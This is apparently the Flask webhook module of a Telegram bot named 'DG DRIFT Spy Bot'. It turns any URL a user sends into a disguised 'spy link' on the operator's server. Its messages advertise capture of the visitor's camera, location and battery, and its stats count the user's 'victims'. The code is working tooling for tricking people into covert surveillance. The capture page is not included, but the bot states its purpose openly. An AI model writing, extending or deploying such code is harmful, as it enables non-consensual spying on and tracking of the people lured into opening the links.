import time
import json
import datetime

from flask import Blueprint, request, current_app

from config import config
from core.storage import load_json, save_json
from core.telegram import send_message, answer_callback
from core.users import save_user, bump_links_count, broadcast_all_async
from core.security import is_admin, check_force_join, send_force_join_prompt

bp = Blueprint('webhook', __name__)

_pending = {}   # chat_id -> 'broadcast'


@bp.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json(silent=True)
    if not update:
        return 'OK', 200

    try:
        # ---- Callbacks ----
        cb = update.get('callback_query')
        if cb:
            return _handle_callback(cb)

        # ---- Messages ----
        msg = update.get('message')
        if not msg:
            return 'OK', 200

        return _handle_message(msg)
    except Exception:
        current_app.logger.exception("webhook error")
        return 'OK', 200


def _handle_callback(cb):
    data = cb.get('data')
    cb_id = cb.get('id')
    user = cb.get('from', {})
    from_id = user.get('id')
    answer_callback(cb_id)
    save_user(user)

    # Force-join recheck
    if data == 'check_join':
        ok, missing = check_force_join(from_id)
        if ok:
            send_message(from_id, "✅ Verified! Send any URL to create a spy link.", parse_mode=None)
        else:
            send_force_join_prompt(from_id, missing)
        return 'OK', 200

    # Gate everything else
    ok, missing = check_force_join(from_id)
    if not ok and not is_admin(from_id):
        send_force_join_prompt(from_id, missing)
        return 'OK', 200

    if data == 'generate':
        send_message(from_id, '📥 Send target URL\nExample: https://youtube.com', parse_mode=None)

    elif data == 'stats':
        visitors = load_json('visitors.json')
        links = load_json('links.json')
        mine = [vid for vid, v in visitors.items() if str(v.get('generated_by')) == str(from_id)]
        my_links = [c for c, d in links.items() if str(d.get('created_by')) == str(from_id)]
        send_message(from_id,
                     f"📊 Your victims: {len(mine)}\n🔗 Your links: {len(my_links)}",
                     parse_mode=None)

    elif data == 'users':
        if not is_admin(from_id):
            send_message(from_id, "❌ Admin only.", parse_mode=None)
            return 'OK', 200
        users = load_json('users.json')
        lines = [f"👥 *Total Users:* {len(users)}\n"]
        for i, (uid, u) in enumerate(list(users.items())[:30], 1):
            name = f"{u.get('first_name','')} {u.get('last_name','')}".strip() or "No name"
            uname = f"@{u['username']}" if u.get('username') else "—"
            lines.append(f"{i}. {name} ({uname})\n   🆔 `{uid}` | 💬 {u.get('messages',0)} | 🔗 {u.get('links_created',0)}")
        if len(users) > 30:
            lines.append(f"\n_...and {len(users)-30} more. Use /admin._")
        send_message(from_id, "\n".join(lines), parse_mode='Markdown')

    return 'OK', 200


def _handle_message(msg):
    chat_id = msg.get('chat', {}).get('id')
    user = msg.get('from', {})
    text = (msg.get('text') or '').strip()

    if not chat_id:
        return 'OK', 200
    save_user(user)

    # /start — always allowed
    if text == '/start':
        ok, missing = check_force_join(chat_id)
        if not ok and not is_admin(chat_id):
            send_force_join_prompt(chat_id, missing)
            return 'OK', 200

        keyboard = {
            'inline_keyboard': [
                [{'text': '🔗 Generate Spy Link', 'callback_data': 'generate'}],
                [{'text': '📊 My Stats', 'callback_data': 'stats'}],
            ]
        }
        if is_admin(chat_id):
            keyboard['inline_keyboard'].append([{'text': '📢 Broadcast', 'callback_data': 'broadcast'}])
            keyboard['inline_keyboard'].append([{'text': '👥 All Users', 'callback_data': 'users'}])

        send_message(chat_id,
                     "👾 DG DRIFT Spy Bot\n\nSend any URL to create a spy link.",
                     reply_markup=keyboard,
                     parse_mode=None)
        return 'OK', 200

    # Force-join gate
    ok, missing = check_force_join(chat_id)
    if not ok and not is_admin(chat_id):
        send_force_join_prompt(chat_id, missing)
        return 'OK', 200

    # Admin broadcast command
    if text == '/broadcast' and is_admin(chat_id):
        _pending[chat_id] = 'broadcast'
        send_message(chat_id, "📢 Send the message to broadcast. /cancel to abort.", parse_mode=None)
        return 'OK', 200

    if text == '/cancel' and chat_id in _pending:
        _pending.pop(chat_id, None)
        send_message(chat_id, "❌ Cancelled.", parse_mode=None)
        return 'OK', 200

    if _pending.get(chat_id) == 'broadcast' and is_admin(chat_id):
        _pending.pop(chat_id, None)
        broadcast_all_async(msg.get('message_id'), chat_id)
        send_message(chat_id, "🚀 Broadcast started in background.", parse_mode=None)
        return 'OK', 200

    # URL → create link
    if text.startswith('http'):
        domain = text.replace('https://', '').replace('http://', '').split('/')[0]
        domain = domain.replace('www.', '').replace('.', '_')
        short_code = f"{domain}_{str(int(time.time()))[-5:]}"

        links = load_json('links.json')
        links[short_code] = {
            'url': text,
            'created_by': str(chat_id),
            'created_at': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        }
        save_json('links.json', links)
        bump_links_count(chat_id)

        base = config.get('website', '').rstrip('/')
        if not base:
            send_message(chat_id, "⚠️ Server 'website' not configured.", parse_mode=None)
            return 'OK', 200

        spy_link = f"{base}/s/{short_code}"
        send_message(chat_id,
                     f"✅ Spy link created!\n\n{spy_link}\n\n"
                     "Captures: 📸 Camera | 📍 Location | 🔋 Battery",
                     parse_mode=None)
        return 'OK', 200

    return 'OK', 200


@bp.route('/set_webhook')
def set_webhook():
    from core.telegram import set_webhook as tg_set_webhook
    base = config.get('website', '').rstrip('/')
    if not base:
        return {'ok': False, 'error': 'config["website"] not set'}, 400
    if not base.startswith('https://'):
        return {'ok': False, 'error': 'Telegram requires HTTPS'}, 400
    return tg_set_webhook(f"{base}/webhook")


@bp.route('/webhook_info')
def webhook_info():
    from core.telegram import get_webhook_info
    return get_webhook_info()